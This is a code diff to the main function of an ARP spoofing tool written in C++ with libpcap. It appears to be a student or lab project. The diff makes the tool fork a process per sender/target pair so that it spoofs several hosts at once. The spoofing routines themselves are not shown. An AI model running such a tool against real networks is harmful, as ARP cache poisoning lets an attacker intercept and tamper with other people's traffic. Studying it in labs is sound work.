@@ -2,6 +2,7 @@
 #include <pcap.h>
 #include <unistd.h>
 #include <sys/types.h>
+#include <sys/wait.h>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "arp-spoof.h"
@@ -36,21 +37,37 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	for(int i=1; i< argc/2 ; i++) {
-		senderIp = Ip(argv[i*2]);
-		cout <<"Setting Sender IP to: " << argv[i*2] << "\n";
-		targetIp = Ip(argv[i*2 +1]);
-		cout << "Setting Target IP to: " << argv[i*2+1] << "\n";
-		cout << "\nGetting Sender MAC Address...\n";
-		getMACAddress(handle, senderMac, senderIp, attackerMac, attackerIp);
-		cout << "Sender MAC Address: " << string(senderMac) << "\n";
-		cout << "\nGetting Target MAC Address...\n";
-		getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
-		cout << "Target MAC Address: " << string(targetMac) << "\n";
-		cout << "\n=============================================\n\n";
-		cout << "Starting ARP Spoofing!\n";
-		arpSpoof( handle,senderMac, attackerMac,targetMac,targetIp,senderIp);
-		//Todo: functional programming
-
+		pid_t pid = fork();
+		if(pid < 0) {
+			cout << "fork error" << "\n";
+			return -1;
+		}
+		else if(pid == 0) {
+			senderIp = Ip(argv[i*2]);
+			cout <<"["<< i << "] Setting Sender IP to: " << argv[i*2] << "\n";
+			targetIp = Ip(argv[i*2 +1]);
+			cout <<"["<< i << "] Setting Target IP to: " << argv[i*2+1] << "\n\n";
+			cout <<"["<< i << "] Getting Sender MAC Address...\n";
+			getMACAddress(handle, senderMac, senderIp, attackerMac, attackerIp);
+			cout <<"["<< i << "]Sender MAC Address: " << string(senderMac) << "\n\n";
+			cout <<"["<< i << "]Getting Target MAC Address...\n";
+			getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
+			cout <<"["<< i << "]Target MAC Address: " << string(targetMac) << "\n";
+			cout << "\n=============================================\n\n";
+			cout <<"["<< i << "]Starting ARP Spoofing! (Ctrl + c to exit )\n";
+			arpSpoof(handle,senderMac, attackerMac,targetMac,targetIp,senderIp);
+		}
+		else {
+			continue;
+		}
 	}
+
+	// Parent process
+    int status;
+    for (int i=1; i< argc/2 ; i++) {
+        wait(&status); // Wait for child processes to exit
+    }
+    
 	pcap_close(handle);
+	return 0;
 }
